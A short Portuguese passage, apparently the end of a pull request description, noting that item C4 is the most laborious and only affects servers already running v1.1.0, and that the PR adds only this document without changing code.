5. **C4** — o mais trabalhoso, e só morde em servidores que já rodam a v1.1.0.

Este PR **não altera código**: acrescenta apenas este documento.
